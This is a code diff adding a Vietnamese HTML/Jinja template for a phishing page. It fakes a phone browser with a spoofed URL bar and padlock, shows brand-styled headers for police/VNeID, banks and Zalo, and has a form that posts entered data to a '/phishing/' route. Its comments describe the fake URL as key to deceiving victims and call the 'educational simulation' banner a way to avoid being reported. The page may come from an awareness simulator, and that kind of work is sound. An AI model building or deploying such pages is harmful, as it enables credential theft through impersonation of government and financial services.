@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ data.title }}</title>
+    <!-- Tích hợp TailwindCSS để làm giao diện giống App thật -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Tùy biến màu sắc cho từng kịch bản để giống nhận diện thương hiệu */
+        .theme-icon-blue { background: linear-gradient(135deg, #1e3a8a, #3b82f6); } /* Công an, VNeID */
+        .theme-icon-purple { background: linear-gradient(135deg, #581c87, #9333ea); } /* Ngân hàng, CTV */
+        .theme-icon-green { background: linear-gradient(135deg, #14532d, #16a34a); } /* Zalo, Nhắn tin */
+        .theme-icon-red { background: linear-gradient(135deg, #7f1d1d, #dc2626); }
+        .theme-icon-yellow { background: linear-gradient(135deg, #78350f, #d97706); }
+    </style>
+</head>
+<body class="bg-gray-200 flex items-center justify-center min-h-screen p-4">
+
+    <!-- Container điện thoại (Khung giả lập màn hình Mobile) -->
+    <div class="w-full max-w-sm bg-white shadow-2xl rounded-[30px] overflow-hidden relative border-[6px] border-gray-800">
+        
+        <!-- Thanh trạng thái ảo (Pin, Wifi, Giờ) -->
+        <div class="bg-gray-100 flex justify-between items-center px-4 py-2 text-[10px] text-gray-500 font-bold">
+            <span>09:41</span>
+            <div class="flex gap-1">
+                <span>📶</span>
+                <span>LTE</span>
+                <span>🔋 85%</span>
+            </div>
+        </div>
+
+        <!-- Thanh Trình duyệt / URL ảo (Chi tiết rất quan trọng để lừa nạn nhân) -->
+        <div class="bg-gray-100 px-3 py-2 border-b border-gray-300 flex items-center gap-2">
+            <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+            <div class="bg-gray-200 text-xs text-gray-600 px-3 py-1.5 rounded-md flex-1 truncate font-mono">
+                {{ data.fake_url_display }}
+            </div>
+            <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+        </div>
+
+        <!-- Header / Logo thương hiệu động -->
+        <div class="theme-{{ data.color }} p-8 text-white text-center shadow-inner">
+            <div class="text-5xl mb-3 drop-shadow-md">{{ data.icon }}</div>
+            <h1 class="text-xl font-bold tracking-wide uppercase">{{ data.form_title }}</h1>
+            <p class="text-xs mt-2 opacity-80">Hệ thống bảo mật & Xác thực an toàn</p>
+        </div>
+
+        <!-- Form nhập liệu -->
+        <div class="p-6">
+            <form action="/phishing/{{ id }}" method="POST" class="space-y-5">
+                
+                {% for field in data.inputs %}
+                <div class="relative">
+                    <label class="block text-xs font-semibold text-gray-600 mb-1 uppercase tracking-wider">{{ field.name }}</label>
+                    <input 
+                        type="{{ field.type }}" 
+                        name="field_{{ loop.index0 }}"
+                        pattern="{{ field.pattern }}"
+                        class="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:bg-white outline-none transition-all shadow-sm text-sm"
+                        placeholder="Vui lòng nhập..."
+                        required
+                    >
+                    <!-- Chú thích DEMO nhỏ bên dưới -->
+                    <p class="text-[10px] text-gray-400 mt-1 pl-1 italic">{{ field.msg }}</p>
+                </div>
+                {% endfor %}
+
+                <!-- Nút Submit -->
+                <button type="submit" class="theme-{{ data.color }} w-full text-white font-bold py-3.5 rounded-xl transition-all shadow-md mt-4 flex items-center justify-center gap-2 hover:opacity-90 active:scale-95">
+                    <span>Tiếp tục</span>
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                </button>
+            </form>
+        </div>
+
+        <!-- Footer / Hỗ trợ giả mạo -->
+        <div class="bg-gray-50 border-t border-gray-100 p-4 text-center">
+            <p class="text-[10px] text-gray-400">Cam kết bảo mật thông tin chuẩn quốc tế PCI-DSS.</p>
+        </div>
+
+        <!-- CẢNH BÁO AN TOÀN (Bắt buộc phải có để tránh bị report) -->
+        <div class="bg-red-500 text-white text-center py-2 text-[10px] font-bold tracking-widest uppercase">
+            ⚠️ MÔI TRƯỜNG MÔ PHỎNG GIÁO DỤC
+        </div>
+    </div>
+
+</body>
+</html>
